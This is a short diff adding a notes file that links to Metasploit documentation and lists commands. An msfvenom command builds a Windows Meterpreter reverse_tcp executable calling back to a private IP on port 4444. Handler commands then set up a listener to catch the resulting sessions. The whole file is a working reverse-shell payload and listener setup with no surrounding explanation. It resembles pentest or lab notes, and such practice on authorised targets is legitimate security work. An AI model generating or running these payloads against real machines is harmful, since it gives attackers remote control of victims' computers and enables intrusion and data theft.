@@ -1,0 +1,13 @@
+https://docs.rapid7.com/metasploit/use-meterpreter-locally-without-an-exploit/
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.26.157.2 LPORT=4444 --format=exe > _m172.exe
+
+use exploit/multi/handler
+
+set payload windows/meterpreter/reverse_tcp
+set lhost eth0
+set lport 4444
+set ExitOnSession false
+exploit -j
+
+---
